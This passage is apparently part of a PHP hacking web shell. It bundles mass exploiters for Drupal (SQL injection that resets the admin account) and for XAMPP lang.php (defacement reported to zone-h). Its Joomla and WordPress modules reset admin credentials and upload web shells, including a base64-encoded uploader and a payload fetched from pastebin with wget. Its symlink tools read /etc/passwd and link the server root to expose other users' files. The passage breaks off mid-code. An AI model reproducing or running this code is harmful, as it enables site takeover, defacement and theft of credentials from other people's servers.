textarea{background-color:#105700;color:lime;font-weight:bold;font-size: 14px;font-family: Tahoma; border: 1px solid #000000;}
input{FONT-WEIGHT:normal;background-color: #105700;font-size: 11px;font-weight:bold;color: lime; font-family: Tahoma; border: 
1px solid #666666;height:20}
body {
font-family: Tahoma
}
tr {
BORDER: dashed 1px #333;
color: #FFF;
}
td {
BORDER: dashed 1px #333;
color: #FFF;
}
.table1 {
BORDER: 0px Black;

BACKGROUND-COLOR: Black;

color: #FFF;

}

.td1 {

BORDER: 0px;

BORDER-COLOR: #333333;

font: 7pt Verdana;

color: Green;

}

.tr1 {

BORDER: 0px;

BORDER-COLOR: #333333;

color: #FFF;

}

table {

BORDER: dashed 1px #333;

BORDER-COLOR: #333333;

BACKGROUND-COLOR: Black;

color: #FFF;

}

h1{

font-family:Tahoma;

color:yellow;

};

input {

border			: dashed 1px;

border-color		: #333;

BACKGROUND-COLOR: Black;

font: 8pt Verdana;

color: Red;

}

select {

BORDER-RIGHT:  Black 1px solid;

BORDER-TOP:    #DF0000 1px solid;

BORDER-LEFT:   #DF0000 1px solid;

BORDER-BOTTOM: Black 1px solid;

BORDER-color: #FFF;

BACKGROUND-COLOR: Black;

font: 8pt Verdana;

color: Red;

}

submit {

BORDER:  buttonhighlight 2px outset;

BACKGROUND-COLOR: Black;

width: 30%;

color: #FFF;

}

textarea {

border			: dashed 1px #333;

BACKGROUND-COLOR: Black;

font: Fixedsys bold;

color: #999;

}

</STYLE>
</head>
<body>
<center>
<h1>=[ Drupal Mass Scanner by Sid Gifari ]=</h1></font><br>
<center><form method='post' action=''>
<textarea name='url' rows='25' cols='50'>
http://www.target.com
http://www.target2.com
</textarea><br><br>
<input type='submit' name='submit' value='EXPLOIT !'>
</form></center>
<br>
    <?php
   $drupal7  = $_GET['drupal7'];
if($drupal7 == 'drupal7'){
$filename = $_FILES['file']['name'];
$filetmp  = $_FILES['file']['tmp_name'];
echo "<form method='POST' enctype='multipart/form-data'>
   <input type='file'name='file' />
   <input type='submit' value='drupal !' />
</form>";
move_uploaded_file($filetmp,$filename);
}
    error_reporting(0);
    if (isset($_POST['submit'])){
        function exploit($url) {
            $post_data = "name[0;update users set name %3D 'cconroll' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "',status %3D'1' where uid %3D '1';#]=FcUk&name[]=Crap&pass=test&form_build_id=&form_id=user_login&op=Log+in";
            $params = array('http' => array('method' => 'POST', 'header' => "Content-Type: application/x-www-form-urlencoded
", 'content' => $post_data));
            $ctx = stream_context_create($params);
            $data = file_get_contents($url . '/user/login/', null, $ctx);
            if ((stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data) || (stristr($data, 'FcUk Crap') && $data)) {
                $fp = fopen("exploited.txt", 'a+');
                fwrite($fp, "Exploitied  User: cconroll Pass: admin  =====> {$url}/user/login");
                fwrite($fp, "
");
                fwrite($fp, "--------------------------------------------------------------------------------------------------");
                fwrite($fp, "
");
                fclose($fp);
                               
                echo "<font color='green'><b>Exploitied User:<font color='red'> cconroll</font> Pass:<font color='red'> admin</font> =====><a href='{$url}/user/login' target=_blank ><font color='green'> {$url}/user/login </font></a></font></b><br>";
            } else {
                echo "<font color='red'><b>Failed ! ====> {$url}/user/login</font></b><br>";
            }
        }
               
        $urls = explode("
", $_POST['url']);
        foreach ($urls as $url) {
            $url = @trim($url);
            echo exploit($url);
        }
    }
echo "<br />";
echo'<center><a href="exploited.txt">View Exploiter Drupal Sites</a></cenrer>';
?>	                 

                
									
                            
                        <?php
                                    }
                                    ////////////////////////////////////////////////////// ///////////////////////////////////////////////////////////////////////////////////////////////////////

                                    elseif(isset($_GET['x']) && ($_GET['x'] == 'xlang'))
                                    {
                                    ?>
									
									<?php

@set_time_limit(0);
@error_reporting(0);

 
$hekerr = "TeaM_CC"; 
 

echo "<form method='POST'>

<style>

textarea

{

font-size: 15px;

font-family: Tahoma;

color: #008300;

border:solid 1px #008300;

}

 

 

h1{

font-family:Tahoma;

color:yellow;

}

 

table {

width:700px;

}

 

td {

font-family: Tahoma;

width:50%;

text-align:center;

border:1px solid #008300;

}

 

.input

{

color: #008300;

border: solid 1px #008300;

background:#FFFFFF;

margin-top:3px;

width:100px;

}

 

i {

color:#008300;

}

</style>

<body>

<center>

<b><h1>-[ Mass XAMPP Lang Auto Explioter BY SID Gifari]-</h1></b>


<textarea name='sites' cols='50' rows='10'>www.site.com</textarea><br>

<input type='submit' name='scan' value='Scan' class='input'><br>

</form>";

 

if($_POST['scan'])

{

echo "<hr>"; // else if hr

$site = explode("\r\n",$_POST['sites']);

foreach($site as $sites)

{

 

$xxampp = "/xampp/lang.php?Hacked_By_SID_GIFARI";

$xamppcurl = curl_init("{$sites}/$xxampp");

curl_setopt($xamppcurl, CURLOPT_FAILONERROR, true);

curl_setopt($xamppcurl, CURLOPT_FOLLOWLOCATION, true);

curl_setopt($xamppcurl, CURLOPT_RETURNTRANSFER, true);

$resultxampp = curl_exec($xamppcurl);

 

$xsecurity = "/security/lang.php?Hacked_By_BD_LEVEL_7";

$securitycurl = curl_init("{$sites}/$xsecurity");

curl_setopt($securitycurl, CURLOPT_FAILONERROR, true);

curl_setopt($securitycurl, CURLOPT_FOLLOWLOCATION, true);

curl_setopt($securitycurl, CURLOPT_RETURNTRANSFER, true);

$resultsecurity = curl_exec($securitycurl);

 

$xxampptmp = "/xampp/lang.tmp";

$xampptmpcurl = curl_init("{$sites}/$xxampptmp");

curl_setopt($xampptmpcurl, CURLOPT_FAILONERROR, true);

curl_setopt($xampptmpcurl, CURLOPT_FOLLOWLOCATION, true);

curl_setopt($xampptmpcurl, CURLOPT_RETURNTRANSFER, true);

$resultxampptmp = curl_exec($xampptmpcurl);

 

$xsecuritytmp = "/security/lang.tmp";

$securitytmpcurl = curl_init("{$sites}/$xsecuritytmp");

curl_setopt($securitytmpcurl, CURLOPT_FAILONERROR, true);

curl_setopt($securitytmpcurl, CURLOPT_FOLLOWLOCATION, true);

curl_setopt($securitytmpcurl, CURLOPT_RETURNTRANSFER, true);

$resultsecuritytmp = curl_exec($securitytmpcurl);

 

 

if(eregi("Hacked_By_",$resultxampptmp))

{

echo "<a href='http://$sites/$xxampptmp' style='text-decoration: none'>{$sites}$xxampptmp</a><br>Xampp/Lang<br>";

 

        $finalxampp=($sites).($xxampptmp);

        $ch = curl_init ("http://www.zone-h.com/notify/single");

        curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);

        curl_setopt ($ch, CURLOPT_POST, 1);

        curl_setopt ($ch, CURLOPT_POSTFIELDS, "defacer=Team_CC&domain1=$finalxampp&hackmode=1&reason=1");

        if (preg_match ("/color=\"red\">OK<\/font><\/li>/i", curl_exec ($ch))){

                    echo "Zone-h : OK<hr>";

            }else{

                    echo "Zone-h : NO<hr>"; }

        curl_close ($ch);

}

 

else if(eregi("Hacked_By_",$resultsecuritytmp))

{

echo "<a href='http://$sites/$xsecuritytmp' style='text-decoration: none'>{$sites}$xsecuritytmp</a><br>Security/Lang<br>";

 

        $finalsecurity=($sites).($xsecuritytmp);

        $ch = curl_init ("http://www.zone-h.com/notify/single");

        curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);

        curl_setopt ($ch, CURLOPT_POST, 1);

        curl_setopt ($ch, CURLOPT_POSTFIELDS, "defacer=Team_CC&domain1=$finalsecurity&hackmode=1&reason=1");

        if (preg_match ("/color=\"red\">OK<\/font><\/li>/i", curl_exec ($ch))){

                    echo "Zone-h : OK<hr>";

            }else{

                    echo "Zone-h : NO<hr>"; }

        curl_close ($ch);

}

 

else

{

echo "<a href='http://$sites/'>$sites</a><br>Not VuLn<hr>";

}

}

 

}

?>

									
							<?php
                                    }
                                    ////////////////////////////////////////////////////// ///////////////////////////////////////////////////////////////////////////////////////////////////////

                                    elseif(isset($_GET['x']) && ($_GET['x'] == 'jmnu'))
                                    {
                                    ?>
                                    <form action="?y=<?php echo $pwd; ?>&x=jmnu" method="post">
                                        <center>
                                            <?php
                                            error_reporting(0);
                                            //Tu5b0l3d

                                            //thx to: IndoXploit, Hacker-Newbie.org



                                            if($_POST['submitt']){


                                                $host = $_POST['host'];

                                                $username = $_POST['username'];

                                                $password = $_POST['password'];

                                                $db = $_POST['db'];

                                                $dbprefix = $_POST['dbprefix'];

                                                $user_baru = $_POST['user_baru'];

                                                $password_baru = $_POST['password_baru'];

                                                $tanya = $_POST['tanya'];


                                                $prefix = $dbprefix."users";

                                                $pass = md5("$password_baru");

                                                $upda = $db.".".$dbprefix;


                                                mysql_connect($host,$username,$password) or die("Koneksi gagal.. isi data yg bener");

                                                mysql_select_db($db) or die("Database tidak bisa dibuka.. Isi data yg bener");

                                                $tampil=mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                                                $r=mysql_fetch_array($tampil);
                                                $id = $r[id];


                                                mysql_query("UPDATE $prefix SET password='$pass',username='$user_baru' WHERE id='$id'");


                                                function token($target){
                                                    $ch2 = curl_init ("$target");
                                                    curl_setopt ($ch2, CURLOPT_RETURNTRANSFER, 1);
                                                    curl_setopt ($ch2, CURLOPT_FOLLOWLOCATION, 1);
                                                    curl_setopt ($ch2, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                                                    curl_setopt ($ch2, CURLOPT_CONNECTTIMEOUT, 5);
                                                    curl_setopt ($ch2, CURLOPT_SSL_VERIFYPEER, 0);
                                                    curl_setopt ($ch2, CURLOPT_SSL_VERIFYHOST, 0);
                                                    curl_setopt($ch2, CURLOPT_COOKIEJAR,'coker_log');
                                                    curl_setopt($ch2, CURLOPT_COOKIEFILE,'coker_log');
                                                    $data = curl_exec ($ch2);


                                                    preg_match('/<input type="hidden" name="(.*?)" value="1"/', $data, $token);
                                                    $token = $token[1];
                                                    return $token;
                                                }

                                                if ($tanya == "y"){
                                                    $target = $_POST['target'];
                                                    $path = "/administrator/index.php?option=com_templates&view=template&id=503&file=L2Vycm9yLnBocA%3D%3D";
                                                    $site = $target.$path;
                                                    $token1 = token($site);



                                                    $post = array(
                                                        "username" => "$user_baru",
                                                        "passwd" => "$password_baru",
                                                        "lang" => "en-GB",
                                                        "option" => "com_login",
                                                        "task" => "login",
                                                        "return" => "aW5kZXgucGhw",
                                                        "$token1" => "1",
                                                    );

                                                    $ch = curl_init ("$site");
                                                    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
                                                    curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
                                                    curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                                                    curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 5);
                                                    curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
                                                    curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                                    curl_setopt ($ch, CURLOPT_POST, 1);
                                                    @curl_setopt ($ch, CURLOPT_POSTFIELDS, $post);
                                                    curl_setopt($ch, CURLOPT_COOKIEJAR,'coker_log');
                                                    curl_setopt($ch, CURLOPT_COOKIEFILE,'coker_log');
                                                    $masuk = curl_exec ($ch);

                                                    $token2 = token($site);

                                                    $upload = base64_decode("Z3cgZ2FudGVuZw0KPD9waHANCiAgJGZpbGUgPSAkX0ZJTEVTWydmaWxlJ107DQogICRuZXdmaWxlPSJrLnBocCI7DQoJCWlmIChmaWxlX2V4aXN0cygiLi4vLi4vIi4kbmV3ZmlsZSkpIHVubGluaygiLi4uLi8vIi4kbmV3ZmlsZSk7DQogICAgCW1vdmVfdXBsb2FkZWRfZmlsZSgkZmlsZVsndG1wX25hbWUnXSwgIi4uLy4uLyRuZXdmaWxlIik7DQo/Pg0K");

                                                    $post2 = array(
                                                        "jform[source]" => "$upload",
                                                        "task" => "template.save",
                                                        "$token2" => "1",
                                                        "jform[extension_id]"=> "503",
                                                        "jform[filename]" => "/error.php",
                                                    );

                                                    $ch3 = curl_init ("$site");
                                                    curl_setopt ($ch3, CURLOPT_RETURNTRANSFER, 1);
                                                    curl_setopt ($ch3, CURLOPT_FOLLOWLOCATION, 1);
                                                    curl_setopt ($ch3, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                                                    curl_setopt ($ch3, CURLOPT_CONNECTTIMEOUT, 5);
                                                    curl_setopt ($ch3, CURLOPT_SSL_VERIFYPEER, 0);
                                                    curl_setopt ($ch3, CURLOPT_SSL_VERIFYHOST, 0);
                                                    curl_setopt ($ch3, CURLOPT_POST, 1);
                                                    curl_setopt ($ch3, CURLOPT_POSTFIELDS, $post2);
                                                    curl_setopt($ch3, CURLOPT_COOKIEJAR,'coker_log');
                                                    curl_setopt($ch3, CURLOPT_COOKIEFILE,'coker_log');
                                                    $masuk2 = curl_exec ($ch3);

                                                    if(preg_match("#successfully#is", $masuk2)){
                                                        echo "uploader udh ketanem...<br>";
                                                        echo "lanjut mepes...<br>";

                                                        $file_pepes = "hacked.php";
                                                        $ch4 =curl_init("$target/templates/beez3/error.php");
                                                        curl_setopt($ch4, CURLOPT_POST, true);
                                                        curl_setopt($ch4, CURLOPT_POSTFIELDS,
                                                            array('file'=>"@$file_pepes"));
                                                        curl_setopt($ch4, CURLOPT_RETURNTRANSFER, 1);
                                                        curl_setopt ($ch4, CURLOPT_SSL_VERIFYPEER, 0);
                                                        curl_setopt ($ch4, CURLOPT_SSL_VERIFYHOST, 0);
                                                        $postResult = curl_exec($ch4);
                                                        curl_close($ch4);


                                                        $ch5 =curl_init("$target/k.php");
                                                        curl_setopt($ch5, CURLOPT_POST, true);
                                                        curl_setopt($ch5, CURLOPT_RETURNTRANSFER, 1);
                                                        curl_setopt ($ch5, CURLOPT_SSL_VERIFYPEER, 0);
                                                        curl_setopt ($ch5, CURLOPT_SSL_VERIFYHOST, 0);
                                                        $postResult2 = curl_exec($ch5);


                                                        if(preg_match('#hacked#is', $postResult2)){
                                                            echo "<font color='green'>berhasil mepes...</font><br>";
                                                            echo "$target/k.php<br>";
                                                        }
                                                        else{
                                                            echo "<font color='red'>gagal mepes...</font><br>";
                                                            echo "coba aja manual: <br>";
                                                            echo "$target/administrator<br>";
                                                            echo "username: $user_baru<br>";
                                                            echo "password: $password_baru<br>";
                                                        }



                                                    }
                                                    else{
                                                        echo "failed<br>";
                                                        echo "data udh bener. beda template mungkin :(<br>";
                                                        echo "coba aja manual: <br>";
                                                        echo "$target/administrator<br>";
                                                        echo "username: $user_baru<br>";
                                                        echo "password: $password_baru<br>";
                                                    }


                                                    curl_close($ch3);
                                                    curl_close($ch);





                                                }
                                                elseif($tanya == "n"){
                                                    echo "Sukses<br>";
                                                    echo "username: $user_baru<br>";
                                                    echo "password: $password_baru<br>";

                                                }


                                            }



                                            else{

                                                echo '<html>

    <head>

        <title>Edit user in joomla</title>

    </head>



    <body>

            <center>

                <center

                        <br><br><h2>-=Auto Edit User Joomla And Deface=-</h2>

                        <table>

                            <tr><td><form method="post" action="?action"></td></tr>

                            <tr><td><input class ="inputz" type="text" name="host" placeholder="localhost"></td></tr>

                            <tr><td><input class ="inputz" type="text" name="username" placeholder="User DB"></td></tr>

                            <tr><td><input class ="inputz" type="text" name="password" placeholder="Password DB"></td></tr>

                            <tr><td><input class ="inputz" type="text" name="db" placeholder="Database"></td></tr>

                            <tr><td><input class ="inputz" type="text" name="dbprefix" placeholder="dbprefix"></td></tr>

                            <tr><td><input class ="inputz" type="text" name="user_baru" placeholder="New Username"></td></tr>

                            <tr><td><input class ="inputz" type="text" name="password_baru" placeholder="New Password"></td></tr>
                            <tr><td></td></tr>
                            <tr><td></td></tr>
                          

                            <tr><td> Auto Deface <input type="radio" name="tanya" value="y"> y <input type="radio" name="tanya" value="n"> n</td></tr>
                             <tr><td><input class ="inputz" type="text" name="target" placeholder="domain"></td></tr>

                            <tr><td><input class ="inputzbut" type="submit" value="Submit" name="submitt"></td></tr>

                        </table>
                        

            </center>

    </body>';

                                            }



                                            ?>

                                        </center>
                                        <?php
                                        }
                                        ////////////////////////////////////////////////////// ///////////////////////////////////////////////////////////////////////////////////////////////////////

                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'wpnu'))
                                        {
                                        ?>
                                        <form action="?y=<?php echo $pwd; ?>&x=wpnu" method="post">
                                            <center>
                                                <!-- menu start -->
                                                <center><div id="menu"><br><br>

                                                        <?php
                                                        //Tu5b0l3d
                                                        //IndoXPloit, HNc
                                                        //http://indoxploit.blogspot.co.id/2015/10/auto-edit-user-and-deface-in-wordpress.html

                                                        if($_POST){
                                                            $host = $_POST['host'];
                                                            $username = $_POST['username'];
                                                            $password = $_POST['password'];
                                                            $db = $_POST['db'];
                                                            $dbprefix = $_POST['dbprefix'];
                                                            $user_baru = $_POST['user_baru'];
                                                            $password_baru = $_POST['password_baru'];
                                                            $prefix = $db.".".$dbprefix."users";
                                                            $sue = $db.".".$dbprefix."options";
                                                            $tanya = $_POST['tanya'];
                                                            $target = $_POST['target'];
                                                            $nick = $_POST['nick'];
                                                            $pass = md5("$password_baru");


                                                            mysql_connect($host,$username,$password) or die("Koneksi gagal.. isi data yg bener");
                                                            mysql_select_db($db) or die("Database tidak bisa dibuka.. Isi data yg bener");

                                                            $tampil=mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
                                                            $r=mysql_fetch_array($tampil);
                                                            $id = $r[ID];

                                                            $tampil2=mysql_query("SELECT * FROM $sue ORDER BY option_id ASC");
                                                            $r2=mysql_fetch_array($tampil2);
                                                            $target = $r2[option_value];


                                                            mysql_query("UPDATE $prefix SET user_pass='$pass',user_login='$user_baru' WHERE ID='$id'");




                                                            if($tanya=="y"){

                                                                function ambilKata($param, $kata1, $kata2){
                                                                    if(strpos($param, $kata1) === FALSE) return FALSE;
                                                                    if(strpos($param, $kata2) === FALSE) return FALSE;
                                                                    $start = strpos($param, $kata1) + strlen($kata1);
                                                                    $end = strpos($param, $kata2, $start);
                                                                    $return = substr($param, $start, $end - $start);
                                                                    return $return;
                                                                }

                                                                function anucurl($sites){
                                                                    $ch1 = curl_init ("$sites");
                                                                    curl_setopt ($ch1, CURLOPT_RETURNTRANSFER, 1);
                                                                    curl_setopt ($ch1, CURLOPT_FOLLOWLOCATION, 1);
                                                                    curl_setopt ($ch1, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                                                                    curl_setopt ($ch1, CURLOPT_CONNECTTIMEOUT, 5);
                                                                    curl_setopt ($ch1, CURLOPT_SSL_VERIFYPEER, 0);
                                                                    curl_setopt ($ch1, CURLOPT_SSL_VERIFYHOST, 0);
                                                                    curl_setopt($ch1, CURLOPT_COOKIEJAR,'coker_log');
                                                                    curl_setopt($ch1, CURLOPT_COOKIEFILE,'coker_log');
                                                                    $data = curl_exec ($ch1);
                                                                    return $data;
                                                                }

                                                                function lohgin($cek, $web, $userr, $pass){
                                                                    $post = array(
                                                                        "log" => "$userr",
                                                                        "pwd" => "$pass",
                                                                        "rememberme" => "forever",
                                                                        "wp-submit" => "Log In",
                                                                        "redirect_to" => "$web/wp-admin/",
                                                                        "testcookie" => "1",
                                                                    );
                                                                    $ch = curl_init ("$cek");
                                                                    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
                                                                    curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
                                                                    curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                                                                    curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
                                                                    curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                                                    curl_setopt ($ch, CURLOPT_POST, 1);
                                                                    curl_setopt ($ch, CURLOPT_POSTFIELDS, $post);
                                                                    curl_setopt($ch, CURLOPT_COOKIEJAR,'coker_log');
                                                                    curl_setopt($ch, CURLOPT_COOKIEFILE,'coker_log');
                                                                    $data6 = curl_exec ($ch);
                                                                    return $data6;
                                                                }

                                                                $site= "$target/wp-login.php";
                                                                $site2= "$target/wp-admin/theme-install.php?upload";
                                                                $a = lohgin($site, $target, $user_baru, $password_baru);
                                                                $b = lohgin($site2, $target, $user_baru, $password_baru);


                                                                $anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
                                                                echo "# token -> $anu2<br>";


                                                                system('wget http://pastebin.com/raw.php?i=mEQP6prW');
                                                                system('cp raw.php?i=mEQP6prW m.php');

                                                                $post2 = array(
                                                                    "_wpnonce" => "$anu2",
                                                                    "_wp_http_referer" => "/wp-admin/theme-install.php?upload",
                                                                    "themezip" => "@m.php",
                                                                    "install-theme-submit" => "Install Now",
                                                                );
                                                                $ch = curl_init ("$target/wp-admin/update.php?action=upload-theme");
                                                                curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
                                                                curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
                                                                curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                                                                curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
                                                                curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                                                curl_setopt ($ch, CURLOPT_POST, 1);
                                                                curl_setopt ($ch, CURLOPT_POSTFIELDS, $post2);
                                                                curl_setopt($ch, CURLOPT_COOKIEJAR,'coker_log');
                                                                curl_setopt($ch, CURLOPT_COOKIEFILE,'coker_log');
                                                                $data3 = curl_exec ($ch);

                                                                $namafile = "wew.php";
                                                                $fp2 = fopen($namafile,"w");
                                                                fputs($fp2,$nick);

                                                                $y = date("Y");
                                                                $m = date("m");


                                                                $ch6 = curl_init("$target/wp-content/uploads/$y/$m/m.php");
                                                                curl_setopt($ch6, CURLOPT_POST, true);
                                                                curl_setopt($ch6, CURLOPT_POSTFIELDS,
                                                                    array('file3'=>"@$namafile"));
                                                                curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
                                                                curl_setopt($ch6, CURLOPT_COOKIEFILE, "coker_log");
                                                                $postResult = curl_exec($ch6);
                                                                curl_close($ch6);

                                                                $as = "$target/k.php";
                                                                $bs = file_get_contents($as);
                                                                if(preg_match("#hacked#si",$bs)){
                                                                    echo "# <font color='green'>Defaced...</font><br>";
                                                                    echo "# $target/k.php<br>";
                                                                }
                                                                else{
                                                                    echo "# <font color='red'>Failed...</font><br>";
                                                                    echo "# Try Manually: <br>";
                                                                    echo "# $target/wp-login.php<br>";
                                                                    echo "# username: $user_baru<br>";
                                                                    echo "# password: $password_baru<br>";


                                                                }




                                                            }

                                                            elseif($tanya=="n"){
                                                                echo "# Success<br>";
                                                                echo "# username: $user_baru<br>";
                                                                echo "# password: $password_baru<br>";
                                                            }



                                                        }else{
                                                            echo '<html>
        <head>
                <title>Wordpress Created New User</title>
        </head>
 
        <body>
                        <center>
                                <center><div id="button"></div>
                                                <h2>-=Wordpress Created New User And Deface=-</h2><br>
                                                <table>
                                                        <tr><td><form method="post" action="?action"></td></tr>
                                                        <tr><td>Host			<input class ="inputz" type="text" name="host" placeholder="localhost"></td></tr>
                                                        <tr><td>User DB			<input class ="inputz" type="text" name="username" placeholder="User DB"></td></tr>
                                                        <tr><td>Password DB		<input class ="inputz" type="text" name="password" placeholder="Password DB"></td></tr>
                                                        <tr><td>Name Database	<input class ="inputz" type="text" name="db" placeholder="Database"></td></tr>
                                                        <tr><td>DB Prefix		<input class ="inputz" type="text" name="dbprefix" placeholder="dbprefix"></td></tr>
                                                        <tr><td>New Username	<input class ="inputz" type="text" name="user_baru" placeholder="New Username"></td></tr>
                                                        <tr><td>New Password	<input class ="inputz" type="text" name="password_baru" placeholder="New Password"></td></tr>
                                                          <tr><td> Auto Deface <input type="radio" name="tanya" value="y"> y <input type="radio" name="tanya" value="n"> n</td></tr>
                         
                            <tr><td><input type="text" class ="inputz" name="nick" placeholder="Hacked By Sid Gifari"></td></tr>
                                                        <tr><td><input class ="inputzbut" type="submit" value="Submit"></td></tr>
                                                </table>
                                                
                        </center>
        </body>';
                                                        }

                                                        ?>


                                                    </div></center>
                                                <!-- menu end -->
                                            </center>
											
											<br></div>

			
                                            <?php
                                            }



                                            ////////////////////////////////////////////////////////////////////////////////////////////////////////////
                                            elseif(isset($_GET['x']) && ($_GET['x'] == 'symfil')) {@set_time_limit(0);@mkdir('sym',0777);error_reporting(0);
                                                $htaccess  = "Options all \n DirectoryIndex gaza.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
                                                $op =@fopen ('sym/.htaccess','w');
                                                fwrite($op ,$htaccess);
                                                echo '<br><br><center><h2>-=Symlink File=-</h2></center><center><br>
<div class="mybox"><h2 class="k2ll33d2">Symlink</h2><br>
<form method="post"> File Path:<br>
<input class="inputz" type="text" name="file" value="/home/user/public_html/config.php" size="60"/>
<br>Symlink Name<br><input class="inputz" type="text" name="symfile" value="s.txt" size="60"/><br><br>
<input class="inputzbut" type="submit" value="symlink" name="symlink" /><br><br></form></div></center>';
                                                $target = $_POST['file'];
                                                $symfile = $_POST['symfile'];
                                                $symlink = $_POST['symlink'];
                                                if ($symlink) {@symlink("$target","sym/$symfile");
                                                    echo '<br><center><a target="_blank" href="sym/'.$symfile.'" >'.$symfile.'</a><br><br><br><br></center>';}}
                                            /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                                            //sym sec
                                            elseif(isset($_GET['x']) && ($_GET['x'] == 'symsr')){
                                                $d0mains = @file("/etc/named.conf");
##httaces
                                                if($d0mains){
                                                    @mkdir("k2",0777);
                                                    @chdir("k2");
                                                    @exe("ln -s / root");
                                                    $file3 = 'Options all
DirectoryIndex Sux.html
AddType text/plain .php 
AddHandler server-parsed .php 
AddType text/plain .html 
AddHandler txt .html 
Require None 
Satisfy Any';
                                                    $fp3 = fopen('.htaccess','w');
                                                    $fw3 = fwrite($fp3,$file3);@fclose($fp3);
                                                    echo "<br><br><center><h2>Symlink Server !</h2></center><br><br>
<table align=center border=1 style='width:60%;border-color:#333333;'>
<tr>
<td align=center><font size=3>S. No.</font></td>
<td align=center><font size=3>Domains</font></td>
<td align=center><font size=3>Users</font></td>
<td align=center><font size=3>Symlink</font></td>
</tr>";
                                                    $dcount = 1;
                                                    foreach($d0mains as $d0main){
                                                        if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);
                                                            flush();
                                                            if(strlen(trim($domains[1][0])) > 2){
                                                                $user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
                                                                echo "<tr align=center><td><font size=3>" . $dcount . "</font></td>
<td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
<td>".$user['name']."</td>
<td><a href='/k2/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>";
                                                                flush();
                                                                $dcount++;}}}
                                                    echo "</table>";
                                                }else{
                                                    $TEST=@file('/etc/passwd');
                                                    if ($TEST){
                                                        @mkdir("k2",0777);
                                                        @chdir("k2");
                                                        exe("ln -s / root");
                                                        $file3 = 'Options all 
 DirectoryIndex Sux.html 
 AddType text/plain .php 
 AddHandler server-parsed .php 
  AddType text/plain .html 
 AddHandler txt .html 
 Require None 
 Satisfy Any';
                                                        $fp3 = fopen('.htaccess','w');
                                                        $fw3 = fwrite($fp3,$file3);
                                                        @fclose($fp3);
                                                        echo "<br><br><center><h2>-=Symlink Server=-</h2></center><br><br>
 <table align=center border=1><tr>
 <td align=center><font size=4>S. No.</font></td>
 <td align=center><font size=4>Users</font></td>
 <td align=center><font size=4>Symlink</font></td></tr>";
                                                        $dcount = 1;
                                                        $file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
                                                        while(!feof($file)){
                                                            $s = fgets($file);
                                                            $matches = array();
                                                            $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
                                                            $matches = str_replace("home/","",$matches[1]);
                                                            if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
                                                                continue;
                                                            echo "<tr><td align=center><font size=3>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
                                                            echo "<td align=center><font class=txt><a href=/k2/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
                                                            $dcount++;}fclose($file);
                                                        echo "</table>";}else{if($os != "Windows"){@mkdir("k2",0777);@chdir("k2");@exe("ln -s / root");$file3 = 'Options all 
 DirectoryIndex Sux.html
 AddType text/plain .php
 AddHandler server-parsed .php 
  AddType text/plain .html 
 AddHandler txt .html 
 Require None 
 Satisfy Any';
                                                        $fp3 = fopen('.htaccess','w');
                                                        $fw3 = fwrite($fp3,$file3);@fclose($fp3);
                                                        echo "<br><br><center><h2>-=Symlink Server=-</h2></center><br><br><center>
 <div class='mybox'><h2 class='k2ll33d2'>server symlinker</h2>
 <table align=center border=1><tr>
 <td align=center><font size=4>ID</font></td>
 <td align=center><font size=4>Users</font></td>
 <td align=center><font size=4>Symlink</font></td></tr>";
                                                        $temp = "";$val1 = 0;$val2 = 1000;
                                                        for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);
                                                            if ($uid)$temp .= join(':',$uid)."\n";}
                                                        echo '<br/>';$temp = trim($temp);$file5 =
